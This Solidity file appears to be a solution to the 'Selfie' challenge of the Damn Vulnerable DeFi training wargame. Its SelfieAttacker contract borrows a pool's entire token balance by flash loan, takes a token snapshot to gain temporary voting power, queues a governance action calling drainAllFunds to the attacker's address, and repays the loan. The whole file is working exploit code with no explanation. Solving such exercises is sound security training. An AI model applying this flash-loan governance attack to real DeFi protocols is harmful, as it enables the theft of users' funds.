// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

/**
 * @title 
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfieAttacker {
    ISelfiePool public immutable pool;
    ISimpleGovernance public immutable governance;
    address public owner;
    uint256 public actionId;
    DamnValuableTokenSnapshot public token;


    constructor(address _pool, address _governance, address _token) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        owner = msg.sender;
    }

    // specify amount
    function Attack() external {
        uint256 balance = token.balanceOf(address(pool));

        pool.flashLoan(balance);

    }

    function receiveTokens(address _token,uint256 amount) external {
        DamnValuableTokenSnapshot(_token).snapshot();
        // data
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);

        // queue action
       actionId = governance.queueAction(address(pool), data, 0);

        // send back tokens
        DamnValuableTokenSnapshot(_token).transfer(address(pool), amount);
    }

}
